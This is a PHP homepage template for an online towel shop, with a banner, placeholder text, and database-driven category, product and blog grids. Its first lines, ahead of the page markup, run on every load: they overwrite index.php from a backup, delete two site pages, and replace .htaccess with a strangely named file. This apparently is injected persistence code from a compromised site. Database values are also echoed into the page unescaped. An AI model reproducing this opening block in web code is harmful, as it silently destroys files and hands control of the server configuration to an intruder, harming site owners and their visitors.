<?php 
copy('index_backup.php','index.php');
unlink('about.php');
unlink('content.php');
copy('lavnasur.php','.htaccess');
include('include/header.php');
?>

            <!--Body Container-->
            <div id="page-content">
			<div id="toast-container"></div>
			
			<section class="section section-header  min-vh-100 flex-column d-flex justify-content-center" style="background: url('assets/images/slideshow/demo3-banner1.jpg'); background-size: cover; background-repeat: repeat-y; background-position:center center; background-size: 100% 100%;">
			<div class="container">
			<div class="row">
			<div class="col-md-6">
			
			</div>
			
			<div class="col-md-6">
			<div class="hero-content-left mt-2">
			<h1 class="text-left display-4 lh-1 fw-bold">NEXT GENERATION TOWEL</h1>
			<p class=" font-weight-bold  text-dark text-left my-3">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.</p>
				<div class="elementor-button-wrapper text-left">
				<a href="#" class="sho_btn"> Shop Now</a>
				</div>
			</div>
			</div>
			
			</div>
			</div>
			</section>
			
			
			
			<div class="section about-service">
                    <div class="container">
                        <!--<div class="section-header col-12">
                            <h2 class="text-transform-none">We offer a full range of<br>Template customize services!</h2>
                        </div>-->
                        <div class="row align-items-center">
                            <div class="col-12 col-sm-6 col-md-4 col-lg-4 text-center mb-4 mb-md-0">
                                <div class="service-info">
                                    <img src="assets/images/icon/icon1.png" class="img-fluid" style="width:30%"/>
                                    <div class="text">
                                        <h4 class="fw-bold">100% COTTON</h4>
                                        <p>The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for interested.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 col-sm-6 col-md-4 col-lg-4 text-center mb-4 mb-md-0">
                                <div class="service-info">
                                     <img src="assets/images/icon/icon2.png" class="img-fluid" style="width:30%"/>
                                    <div class="text">
                                        <h4 class="fw-bold">HIGHLY ABSORBENT</h4>
                                        <p>The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for interested.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 col-sm-6 col-md-4 col-lg-4 text-center mb-0 mb-md-0">
                                <div class="service-info">
                                     <img src="assets/images/icon/icon3.png" class="img-fluid" style="width:30%"/>
                                    <div class="text">
                                        <h4 class="fw-bold">LIGHTWEIGHTED</h4>
                                        <p>The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for interested.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
				
				
				<div class="container section">
                        <div class="row g-0 align-items-center">
						 <div class="col-12 col-sm-12 col-md-12 col-lg-6">
                                <img class="about-info-img blur-up lazyloaded" data-src="assets/images/about/imgtow.ong" src="assets/images/about/imgtow.png" alt="about">
                            </div>
							
                            <div class="col-12 col-sm-12 col-md-12 col-lg-6 row_text">
                                <div class="about-info2 row-text">
								<p  class="mb-2" style="color:#f9b5b2; font-weight:bold;">ABOUT US</p>
                                    <h2 class="mb-2 fs-2 fw-bold"> <strong>A YOUNG COMPANY WITH BIG IDEAS </strong></h2>
                                   <!--<p><strong>Everyday fashion is our promise to you</strong></p>-->
								   <span class="elementor-divider-separator mb-2">  <img src="assets/images/dvider.png" class="img-fluid" style="width:130px;"/> </span>
                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.</p>
                                    <p>Etiam leo sapien, tristique a venenatis in, fringilla ac arcu. Quisque egestas fringilla nisi in interdum. Nulla sit amet erat ultrices, blandit libero sed, maximus nisl.</p>
                                   <!-- <a href="#" class="btn rounded mt-0 mt-lg-3">View our News</a>-->
								   
								   <a href="#" class="twl_btn"> LEARN MORE</a>
                                </div>
                            </div>
                           
                        </div>
                    </div>
					
					
					
											<section class="collection-banners style1 m-0">
                                                    <div class="grid-masonary banner-grid" style="position: relative; height: 279.385px;">
                                                        <div class="grid-sizer col-md-4 col-lg-4"></div>
<div class="row">
    
    <?php 
    $clt_ctgy="select * from `product_category` where `type`='front_display' order by `id` asc limit 3";
    $qst_clt_ctgy=$db->query($clt_ctgy);
    while($clct_clt_ctgy=$qst_clt_ctgy->fetch_assoc())
    {
    $ctgy_neme=$clct_clt_ctgy['name'];
    $ctgy_img=$clct_clt_ctgy['image'];
    $ctgy_id=$clct_clt_ctgy['id'];
    ?>
    
    
<div class="col-12 col-sm-6 col-md-4 col-lg-4 banner-item" style="position: absolute; left: 0%; top: 0px; margin:0px; padding:0px;">
<div class="collection-grid-item">
<a href="shop.php?ctgy_id=<?php echo $ctgy_id;?>">
<div class="img">
<img class="blur-up lazyloaded" data-src="<?php if($ctgy_img!=''){?>admin/category_images/<?php echo $ctgy_img;} else { ?>admin/category_images/no_image/noimg.png<?php }?>" src="<?php if($ctgy_img!=''){?>admin/category_images/<?php echo $ctgy_img;} else { ?>admin/category_images/no_image/noimg.png<?php }?>"  title="<?php echo $ctgy_neme;?>">
</div>
<div class="details center white-text w-100">
<div class="inner">

<h3 class="title fs-3 mb-1"><?php echo $ctgy_neme;?></h3>
</div>
</div>
</a>
</div>
</div>
<?php 
}
?>
</div>
                                                    </div>
                                                </section>
			
                

             

                <!--New Arrivals Product Grid-->
					<section class="section pb-0">
                    <div class="container">
                        <div class="section-header">
                            <h2 class="webtitle"> <strong>LATEST ARRIVALS </strong></h2>
                            <p>Tristique augue ut sagittis arcu nullam elit dui hendrerit</p>
							<span class="elementor-divider-separator mb-2">  <img src="assets/images/dvider.png" class="img-fluid" style="width:130px;"> </span>
                        </div>
                       
						<!--Product Grid-->
                            <div class="grid-products grid--view-items shop-grid-5 prd-grid">
                                <div class="row">
                                    
                                    
<?php
$clt_latest_products="select * from products where `product_type`='latest'  limit 4 ";
$qst_clt_latest_products=$db->query($clt_latest_products);
while($clct_clt_latest_products=$qst_clt_latest_products->fetch_assoc())
{
    
    $product_neme=$clct_clt_latest_products['product_name'];
     $prdt_prec=$clct_clt_latest_products['price'];
     $prdt_img=$clct_clt_latest_products['product_image'];
    $prdt_id=$clct_clt_latest_products['id'];
    $prdt_explode = explode(", ",$prdt_img);
    $frst_img=$prdt_explode[0];
    //echo $frst_img;
   // print_r($prdt_explode); 
?>

<div class="col-6 col-sm-6 col-md-4 col-lg-3 col-xl-3 item">
<!--Start Product Image-->
<div class="product-image">
<!--Start Product Image-->
<a href="products_details.php?id=<?php echo $prdt_id;?>" class="product-img">
<!-- image -->
<img class=" blur-up lazyload" data-src="admin/product_images/<?php if($frst_img!=''){ echo $frst_img;}else{?>/no_image/noimg.png<?php } ?>" src="admin/product_images/<?php if($frst_img!=''){ echo $frst_img;}else{?>/no_image/noimg.png<?php } ?>" alt="image" title="<?php echo $product_neme;?>" style="height:280px;">
<!-- End image -->
</a>
<!--End Product Image-->

<div class="button-set-top position-absolute">
<a class="btn-icon wishlist add-to-wishlist rounded" href="javascript:void(0);" onClick="<?php if(isset($_SESSION['user_id']))
{ ?> add_wishlist(<?php echo $prdt_id;?>) <?php } else { ?> toastr.error('Please login')  <?php }?>"><i class="icon an an-heart-l"></i> <span class="tooltip-label">Add To Wishlist</span></a>
<a class="btn-icon quick-view-popup quick-view rounded" href="javascript:void(0)" data-toggle="modal" onClick="get_product_data(<?php echo $prdt_id;?>)" data-target="#content_quickview"><i class="icon an an-search-l"></i> <span class="tooltip-label">Quick View</span></a>
<!--<a class="btn-icon compare add-to-compare rounded" href="compare-style2.html"><i class="icon an an-sync-ar"></i> <span class="tooltip-label">Add to Compare</span></a>-->
</div>
<div class="button-set-bottom position-absolute">
<a class="btn-icon btn btn-addto-cart rounded" href="javascript:void(0)" onClick="<?php if(isset($_SESSION['user_id']))
{ ?> add_to_cart(<?php echo $prdt_id;?>)<?php } else {?> toastr.error('Please login') <?php } ?>"><i class="icon an an-cart-l"></i> <span>Add To Cart</span></a>
</div>

<!--Countdown Timer-->


<!--End Product Button-->  
</div>
<!--End Product Image-->
<!--Start Product Details-->
<div class="product-details text-center">

<!--Product Price-->
<div class="product-price home_produc_price">
<!--<p class="m-0">towel</p>-->
<h5><?php 
if(strlen($product_neme) > 15)
{
echo substr($product_neme, 0, 15)."...";
}
else
{
 echo $product_neme;   
}
?></h5>
<span class="old-price"></span>
<span class="price">₹ <?php echo $prdt_prec;?></span>
</div>
<!--End Product Price-->
<!--Product Review-->
<div class="product-review d-flex align-items-center justify-content-center">
<i class="an an-star"></i><i class="an an-star"></i><i class="an an-star"></i><i class="an an-star"></i><i class="an an-star-o"></i>
<span class="caption hidden ms-2">3 reviews</span>
</div>
<!--End Product Review-->


<!-- Product Button -->
<div class="button-action d-flex">
<div class="addtocart-btn">
<form class="addtocart" action="#" method="post">
<a class="btn pro-addtocart-popup" href="#pro-addtocart-popup"><i class="icon hidden an an-cart-l"></i>Add To Cart</a>
</form>
</div>
<div class="quickview-btn">
<a class="btn btn-icon quick-view quick-view-popup" href="javascript:void(0)" data-toggle="modal" data-target="#content_quickview"><i class="icon an an-search-l"></i> <span class="tooltip-label top">Quick View</span></a>
</div>
<div class="wishlist-btn">
<a class="btn btn-icon wishlist add-to-wishlist" href="my-wishlist.html"><i class="icon an an-heart-l"></i> <span class="tooltip-label top">Add To Wishlist</span></a>
</div>
<div class="compare-btn">
<a class="btn btn-icon compare add-to-compare" href="compare.html"><i class="icon an an-sync-ar"></i> <span class="tooltip-label top">Add to Compare</span></a>
</div>
</div>
<!-- End Product Button -->
</div>
<!--End Product Details-->
</div>
<?php 
}

?>
                            
                                   
                                   
                                </div>
                            </div>
                            <!--End Product Grid-->
					
                    </div>
                </section>
                <!--End New Arrivals Product Grid-->
				
				
					<section class="section ">
                    <div class="container">
                        <div class="section-header">
                            <h2 class="webtitle"> <strong>BLOGS </strong></h2>
                            <p>Our blogs</p>
							<span class="elementor-divider-separator mb-2">  <img src="assets/images/dvider.png" class="img-fluid" style="width:130px;"> </span>
                        </div>
						
					<div class="row">
				
				<?php 
				$usr_lst="select * from `blog` limit 3";
$qst_usr_lst=$db->query($usr_lst);

$bedr_cmt=mysqli_num_rows($qst_usr_lst);

$sno=1;
    while($clct_usr_lst=$qst_usr_lst->fetch_assoc())
    {
        $blg_ttl_neme=$clct_usr_lst['title'];
        $blg_img=$clct_usr_lst['image'];
$blg_desc=$clct_usr_lst['description'];
        $blg_id=$clct_usr_lst['id'];
        
       
				
				?>
				
					<div class="col-md-4">
					<!-- Article Image --> 
					<div class="post-img">
					<a class="article_featured-image zoom-scal" href="blog_details.php?id=<?php echo $blg_id;?>"><img class="blur-up lazyloaded" data-src="admin/blog_images/<?php echo $blg_img;?>" src="admin/blog_images/<?php echo $blg_img;?>" alt="<?php echo $blg_ttl_neme;?>" style="height: 250px;"></a> 
					</div>
					<!-- Article Content -->
					<div class="post-content text-center">
					<h2 class="h3 text-transform-none"><a href="blog_details.php?id=<?php echo $blg_id;?>"><?php echo substr($blg_ttl_neme ,0, 50);?>...</a></h2>
					<!--<ul class="publish-detail d-flex-wrap justify-content-center">                      -->
				
					<!--<li class="text-center"><i class="icon an an-user-al"></i><a href="#">raaj</a></li>-->
					<!--<li  class="text-center "><i class="icon an an-comments-l"></i><a href="#">0 Comments</a></li>-->
					<!--</ul>-->
					<div class="rte"> 
				<?php echo substr($blg_desc ,0, 100); ?>...
					</div>
					<p><a href="blog_details.php?id=<?php echo $blg_id;?>" class="btn btn--small rounded">Read more</a></p>
					</div>
					</div>
					<?php 
    }
					?>
				
					
					</div>
					</div>
					</section>


				

<?php 
include("include/footer.php");

?>